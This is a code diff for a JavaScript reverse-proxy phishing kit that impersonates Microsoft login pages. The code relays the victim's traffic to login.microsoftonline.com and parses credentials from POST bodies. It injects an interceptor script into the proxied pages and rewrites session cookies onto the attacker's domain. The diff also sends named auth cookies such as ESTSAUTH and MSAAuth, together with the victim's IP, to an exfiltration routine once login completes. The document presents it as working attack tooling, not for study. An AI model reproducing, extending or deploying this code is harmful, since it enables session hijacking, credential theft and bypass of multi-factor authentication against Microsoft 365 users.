@@ -7,14 +7,21 @@ const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
-// Auth tokens to capture
-const AUTH_TOKENS = {
-  'login.microsoftonline.com': ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx', 'CCState', 'buid', 'fpc'],
-  'login.live.com': ['ESTSAUTH', 'ESTSAUTHPERSISTENT'],
-  'account.live.com': ['MSAAuth', 'MSAAuthP'],
-  'office.com': ['O365', 'OfficeSession'],
-  'www.office.com': ['O365', 'OfficeSession']
-};
+// Auth tokens to capture (only these specific cookies)
+const AUTH_TOKEN_NAMES = [
+  'ESTSAUTH',
+  'ESTSAUTHPERSISTENT', 
+  'ESTSAUTHLIGHT',
+  'SignInStateCookie',
+  'esctx',
+  'CCState',
+  'buid',
+  'fpc',
+  'MSAAuth',
+  'MSAAuthP',
+  'O365',
+  'OfficeSession'
+];
 
 // URLs that indicate successful authentication
 const AUTH_URLS = [
@@ -28,8 +35,7 @@ const AUTH_URLS = [
   '/mail',
   '/calendar',
   '/onedrive',
-  '/auth',
-  '/login'
+  '/auth'
 ];
 
 const IDENTITY_PROVIDERS = {
@@ -110,7 +116,7 @@ function cleanQueryString(search) {
   return result ? '?' + result : '';
 }
 
-// ==================== ADVANCED URL PARSER (NO BLOCKING) ====================
+// ==================== ADVANCED URL PARSER ====================
 
 function parseUrl(pathname, search) {
   console.log(`[PARSE] Input: ${pathname}`);
@@ -269,15 +275,9 @@ function isAuthUrl(path) {
   return AUTH_URLS.some(authPath => path.toLowerCase().includes(authPath.toLowerCase()));
 }
 
-function hasAuthCookies(cookieStr, upstream) {
+function hasAuthCookies(cookieStr) {
   if (!cookieStr) return false;
-  
-  const patterns = AUTH_TOKENS[upstream] || AUTH_TOKENS['login.microsoftonline.com'] || [];
-  
-  return patterns.some(pattern => {
-    const regex = new RegExp(pattern, 'i');
-    return regex.test(cookieStr);
-  });
+  return AUTH_TOKEN_NAMES.some(name => cookieStr.toLowerCase().includes(name.toLowerCase()));
 }
 
 function parseCredentials(bodyText) {
@@ -372,6 +372,58 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
   })();</script>`;
 }
 
+// ==================== CRITICAL FIX: COOKIE HANDLING ====================
+
+/**
+ * Process cookies properly to maintain session context
+ * Strategy: Keep cookies as close to original as possible, only rewrite domain for browser compatibility
+ */
+function processCookies(cookies, upstreamDomain) {
+  const modifiedCookies = [];
+  const cookieNames = [];
+  
+  cookies.forEach(cookie => {
+    if (!cookie) return;
+    
+    let modifiedCookie = cookie;
+    cookieNames.push(cookie.split('=')[0]);
+    
+    // Parse cookie attributes
+    const parts = cookie.split(';');
+    const nameValue = parts[0].trim();
+    const attributes = parts.slice(1).map(p => p.trim().toLowerCase());
+    
+    // Check if this is a session cookie we need to preserve
+    const cookieName = nameValue.split('=')[0].trim();
+    
+    // CRITICAL: Only rewrite the domain attribute, preserve everything else exactly
+    // This maintains session context with Microsoft servers
+    
+    // Remove existing domain attribute if present
+    modifiedCookie = modifiedCookie.replace(/domain=[^;]+;?/gi, '');
+    modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/g, '');
+    
+    // Add our domain as the cookie domain (for cross-origin compatibility)
+    // Use the root domain to ensure cookies work across all subpaths
+    modifiedCookie += `; Domain=${YOUR_DOMAIN}`;
+    
+    // Ensure Secure and SameSite for HTTPS cross-origin requests
+    if (!modifiedCookie.toLowerCase().includes('secure')) {
+      modifiedCookie += '; Secure';
+    }
+    if (!modifiedCookie.toLowerCase().includes('samesite')) {
+      modifiedCookie += '; SameSite=None';
+    }
+    
+    // CRITICAL: Don't rewrite the cookie value/path, keep original upstream format
+    // The browser will send these cookies back to our proxy domain
+    
+    modifiedCookies.push(modifiedCookie);
+  });
+  
+  return { modifiedCookies, cookieNames };
+}
+
 // ==================== RESPONSE HANDLING ====================
 
 function createResponseHeaders(resp, options = {}) {
@@ -429,7 +481,10 @@ export default async function handleRequest(request) {
   const isAuthEndpoint = isAuthUrl(info.path);
   console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}${isAuthEndpoint ? ' [AUTH]' : ''}`);
 
+  // Prepare request headers
   const headers = new Headers();
+  
+  // Copy all client headers including cookies (critical for session)
   const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
   
   clientHeaders.forEach(h => {
@@ -437,8 +492,10 @@ export default async function handleRequest(request) {
     if (val) headers.set(h, val);
   });
 
+  // Set upstream Host header (critical)
   headers.set('Host', upstreamDomain);
   
+  // Set proper referer/origin if missing
   if (!request.headers.get('referer')) {
     headers.set('Referer', 'https://' + upstreamDomain + '/');
   }
@@ -446,12 +503,14 @@ export default async function handleRequest(request) {
     headers.set('Origin', 'https://' + upstreamDomain);
   }
 
+  // Remove hop-by-hop headers
   ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
    'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));
 
   let bodyText = null;
   let requestBody = null;
 
+  // Handle credential extraction for POST requests
   if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
     try {
       const cloned = request.clone();
@@ -501,55 +560,89 @@ export default async function handleRequest(request) {
       }
     }
 
-    // Process cookies
+    // Process cookies with improved handling
     const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
-    const modifiedCookies = [];
     let shouldCapture = false;
 
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
       
-      // CRITICAL FIX: Use cookieStr (not cookieString)
-      const hasAuth = hasAuthCookies(cookieStr, upstreamDomain);
+      // Check if this response contains auth cookies
+      const hasAuthCookies = hasAuthCookies(cookieStr);
       const isPostLogin = request.method === 'POST' && (info.path.includes('/login') || info.path.includes('/ProcessAuth'));
       const isAuthRedirect = resp.status === 302 && isAuthUrl(info.path);
+      const isKmsiEndpoint = info.path.includes('/kmsi');
       
-      shouldCapture = isPostLogin || isAuthRedirect || (isAuthEndpoint && hasAuth);
+      // Capture cookies if:
+      // 1. It's a POST to login endpoint (credentials just submitted)
+      // 2. It's a redirect to an auth URL
+      // 3. It's the KMSI (Keep Me Signed In) page
+      // 4. Response contains auth tokens and is an auth endpoint
+      shouldCapture = isPostLogin || isAuthRedirect || isKmsiEndpoint || (isAuthEndpoint && hasAuthCookies);
 
-      console.log(`[COOKIES] ${cookies.length} cookies, auth=${hasAuth}, capture=${shouldCapture}`);
-      console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
+      console.log(`[COOKIES] ${cookies.length} cookies: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
+      console.log(`[COOKIES] hasAuth=${hasAuthCookies}, capture=${shouldCapture}, path=${info.path}`);
 
-      cookies.forEach(cookie => {
-        if (!cookie) return;
+      // Process cookies - preserve session context
+      const { modifiedCookies, cookieNames } = processCookies(cookies, upstreamDomain);
+      
+      // Only exfiltrate if we have actual auth tokens (not just buid/fpc on load)
+      if (shouldCapture && hasAuthCookies) {
+        console.log(`[EXFILTRATING] Auth cookies detected: ${AUTH_TOKEN_NAMES.filter(n => cookieStr.toLowerCase().includes(n.toLowerCase())).join(', ')}`);
+        await exfiltrateCookies(cookieStr, ip, info.type, url.href);
+      }
+
+      // Create response headers with processed cookies
+      const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
+
+      // Process body for HTML/JS/CSS
+      const ct = resp.headers.get('content-type') || '';
+      
+      if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
+        let text = await resp.text();
         
-        let modifiedCookie = cookie;
-        
-        modifiedCookie = modifiedCookie.replace(
-          new RegExp(`domain=${upstreamDomain.replace(/\./g, '\\.')}`, 'gi'),
-          `domain=${YOUR_DOMAIN}`
-        );
-        
-        modifiedCookie = modifiedCookie.replace(
-          new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'),
-          `${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}`
-        );
-        
-        if (!modifiedCookie.toLowerCase().includes('secure')) modifiedCookie += '; Secure';
-        if (!modifiedCookie.toLowerCase().includes('samesite')) modifiedCookie += '; SameSite=None';
-        
-        modifiedCookies.push(modifiedCookie);
-      });
+        // Inject interceptor script for HTML
+        if (ct.includes('text/html')) {
+          const script = generateInterceptorScript(upstreamDomain, info.path);
+          text = text.replace('<head>', '<head>' + script)
+                     .replace('<html>', '<html>' + script);
+          if (!text.includes(script)) text = script + text;
+        }
+
+        // Rewrite domains in content
+        Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
+          const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
+          text = text.split(domain).join(replacement);
+        });
+
+        // Handle relative paths in HTML
+        if (ct.includes('text/html')) {
+          const currentDir = info.path.replace(/\/[^\/]*$/, '/');
+          
+          text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
+            if (path.startsWith('_p/') || path.startsWith('data:')) return m;
+            return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
+          });
+          
+          text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
+          text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
+          
+          text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
+            if (path.startsWith('_p/')) return m;
+            return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
+          });
+        }
+
+        return new Response(text, { status: resp.status, headers: responseHeaders });
+      }
+
+      // Binary/streaming response
+      return new Response(resp.body, { status: resp.status, headers: responseHeaders });
     }
 
-    // Capture auth cookies
-    if (shouldCapture && cookieStr) {
-      console.log(`[EXFILTRATING] Cookies for ${info.type}`);
-      await exfiltrateCookies(cookieStr, ip, info.type, url.href);
-    }
-
-    const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
-
+    // No cookies in response
+    const responseHeaders = createResponseHeaders(resp);
     const ct = resp.headers.get('content-type') || '';
     
     if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
@@ -566,23 +659,6 @@ export default async function handleRequest(request) {
         const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
         text = text.split(domain).join(replacement);
       });
-
-      if (ct.includes('text/html')) {
-        const currentDir = info.path.replace(/\/[^\/]*$/, '/');
-        
-        text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
-          if (path.startsWith('_p/') || path.startsWith('data:')) return m;
-          return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
-        });
-        
-        text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
-        text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
-        
-        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
-          if (path.startsWith('_p/')) return m;
-          return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
-        });
-      }
 
       return new Response(text, { status: resp.status, headers: responseHeaders });
     }
